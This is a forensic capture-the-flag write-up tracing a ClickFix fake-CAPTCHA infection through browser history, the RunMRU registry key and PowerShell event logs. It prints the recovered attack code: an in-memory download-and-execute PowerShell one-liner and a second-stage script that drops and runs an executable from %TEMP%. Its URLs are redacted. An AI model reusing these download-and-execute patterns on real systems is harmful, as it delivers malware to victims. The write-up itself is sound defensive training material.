# CAPTCHA Engineering — Threat Hunting Writeup

* **Platform:** CyberTalents
* **Category:** Threat Hunting / Digital Forensics
* **Difficulty:** Medium
* **Attack Vector:** Fake CAPTCHA / ClickFix Social Engineering

---

## Overview

In this case, a user was compromised after visiting a deceptive website that tricked them into manually executing malicious commands on their Windows machine. My goal was to analyze a triage disk image (`chall.ad1`), reconstruct the full multi-stage attack chain using browser, registry, and event log forensics, and answer six investigation questions on the local verification portal to retrieve the flag.

---

## Step 1: Lab Setup & Loading the Evidence

1. I connected to the analysis workstation over **RDP** (`mstsc`) using the provided lab credentials.
2. I opened Microsoft Edge and navigated to `http://127.0.0.1:5000` to view the six Threat Hunting verification questions.
3. I launched **Exterro FTK Imager** from the desktop and loaded the triage image:
   * **File** -> **Add Evidence Item** -> **Image File** -> Selected `Downloads\chall.ad1`.

---

## Step 2: Browser Forensics (Question 1)

Since the compromise began with a visit to a malicious website, I started by inspecting the victim's browser history.

1. In FTK Imager, I navigated to the Microsoft Edge profile for the user `kill`:
   ```text
   C:\Users\kill\AppData\Local\Microsoft\Edge\User Data\Default\History
   ```
2. I right-clicked the `History` file and selected **Export Files** to save it locally.
3. I opened the exported SQLite database using `https://sqliteviewer.app` and inspected the `urls` table.

### Analysis & Output
Among the normal browsing activity, I spotted a suspicious tunneling domain (hosted on `ngrok-free.app`) that served the fake CAPTCHA lure:
```text
URL: https://[REDACTED_DOMAIN]/
```
* **Question 1 (Deceptive Domain):** `[REDACTED_DOMAIN]`

---

## Step 3: Registry Forensics — RunMRU (Questions 2 & 3)

Next, I needed to find out what command the user was tricked into running.

1. I first checked the PowerShell ConsoleHost history folder at:
   ```text
   C:\Users\kill\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
   ```
   The folder was not present, which strongly indicated that the victim did not type the command into a PowerShell window directly—instead, they likely used the Windows **Run** dialog (`Win + R`), which is the signature technique of a **ClickFix** attack.
2. To verify this, I navigated to `C:\Users\kill\` in FTK Imager and exported **`NTUSER.DAT`** (the user's registry hive).
3. I opened **Registry Explorer** (located in `Downloads\net9\RegistryExplorer`) and loaded the exported `NTUSER.DAT` file.
4. I navigated to the `RunMRU` key, which stores the history of commands executed via the Run dialog:
   ```text
   ROOT\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
   ```

### Analysis & Output
Inside `RunMRU`, I found the exact command the victim pasted and executed:
```text
[REDACTED_EXECUTABLE] [REDACTED_FIRST_URL]
```
* A native Windows LOLBin (Living-off-the-Land Binary) was abused to fetch and execute a remote HTA/script payload directly from a `webhook.site` URL.
* **Question 2 (First Suspicious URL):** `[REDACTED_FIRST_URL]`
* **Question 3 (Native Windows Executable):** `[REDACTED_EXECUTABLE]`

---

## Step 4: Event Log Forensics — Hunting Stage 2 (Question 4)

Because the second-stage script was retrieved and executed **in memory**, I needed to inspect the Windows Event Logs to see what the first stage launched.

1. In FTK Imager, I navigated to:
   ```text
   C:\Windows\System32\winevt\Logs\
   ```
   and exported the logs folder to my Desktop (`Desktop\Logs`).
2. I initially checked `Microsoft-Windows-PowerShell%4Operational.evtx` (Event ID `4104`), but it contained mostly legitimate Windows Defender module noise.
3. I then pivoted to the classic **`Windows PowerShell.evtx`** log (15.7 MB), specifically hunting for **Event ID 400** (Engine Lifecycle) and **Event ID 800** (Pipeline Execution), which record the full `HostApplication` command line whenever PowerShell starts.
4. I ran my PowerShell hunting script ([`hunt_ps_logs.ps1`](./hunt_ps_logs.ps1)) against `Windows PowerShell.evtx` to filter for suspicious keywords (`http`, `iex`, `bypass`, `download`, etc.).

### Analysis & Output
At timestamp `07/12/2025 12:22:44`, Event ID `400` revealed a hidden PowerShell execution with a Base64-encoded URL:

```text
HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & {
    $U=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('[REDACTED_BASE64_STRING]'));
    $C=(Invoke-WebRequest -Uri $U -UseBasicParsing).Content;
    $B=[scriptblock]::Create($C);
    &$B
}
```

This command decodes a Base64 string into a URL (`$U`), downloads its text content (`$C`), converts it into an executable ScriptBlock (`$B`), and runs it entirely **in memory** (`&$B`).

Decoding the Base64 string revealed the full GitHub raw URL for the second-stage script:
* **Question 4 (Second-Stage Script URL):** `[REDACTED_STAGE2_URL]`

---

## Step 5: Inspecting the Second-Stage Script (Questions 5 & 6)

To find out what the third-stage binary was and where it came from, I safely retrieved the text content of the second-stage script **without executing it** using [`fetch_stage2.ps1`](./fetch_stage2.ps1).

### Analysis & Output
The retrieved second-stage PowerShell script contained the following logic:

```powershell
$exeUrl = "[REDACTED_BINARY_URL]"
$tempPath = "$env:TEMP\[REDACTED_BINARY_NAME]"

Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
Start-Process $tempPath
```

This clearly showed the final stage of the infection:
1. It downloads a compiled executable from a GitHub repository (`$exeUrl`).
2. It saves the executable to the user's `%TEMP%` directory under a new filename (`$tempPath`).
3. It launches the dropped binary using `Start-Process`.

* **Question 5 (Dropped Binary Name on System):** `[REDACTED_BINARY_NAME]`
* **Question 6 (Binary Download URL):** `[REDACTED_BINARY_URL]`

---

## Step 6: Attack Chain Summary & Flag

Reconstructing the full kill chain from start to finish:

1. **Initial Access:** The user visited a deceptive fake CAPTCHA page (`[REDACTED_DOMAIN]`).
2. **Execution (Stage 1):** The user was tricked into opening `Win + R` and running `[REDACTED_EXECUTABLE]` pointing to `[REDACTED_FIRST_URL]`.
3. **In-Memory Execution (Stage 2):** Stage 1 spawned `powershell.exe` with `-ExecutionPolicy Bypass` to decode a Base64 URL (`[REDACTED_STAGE2_URL]`) and execute the script directly in memory.
4. **Payload Drop & Execution (Stage 3):** The in-memory script downloaded `[REDACTED_BINARY_URL]`, saved it to `%TEMP%\[REDACTED_BINARY_NAME]`, and executed it.

After submitting all six verified answers to `http://127.0.0.1:5000`, I received the final flag:

```text
Flag{REDACTED}
```